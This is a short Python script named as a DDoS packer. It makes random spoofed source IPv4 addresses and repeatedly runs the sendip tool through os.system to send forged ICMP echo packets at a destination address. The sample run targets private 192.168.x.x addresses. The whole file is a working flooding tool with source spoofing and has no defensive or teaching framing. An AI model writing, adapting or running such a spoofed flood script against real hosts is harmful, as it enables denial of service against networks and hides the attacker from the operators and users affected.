import os
import sys
import time
import random

def generator_ipv4():
    first = str(192)
    two = str(random.randint(0,255))
    three = str(random.randint(0,255))
    four = str(random.randint(1,254))
    ip = '.'.join([first,two,three,four])
    return ip

def ddos_pack(dip, wip, w_size, c_szie):
    for i in range(w_size):
        sip = generator_ipv4()
        tail_sendip = "sendip  -p ipv4 -is " + sip + " -id " + dip
        tail_sendip = tail_sendip + " -p icmp -ct 8 -cd 0 -d 'xqcc001' " + wip
        for j in range(c_szie):
            print(tail_sendip)
            os.system(tail_sendip)

if __name__ == "__main__":
    ddos_pack("192.168.1.2", "192.168.2.1", 10, 2)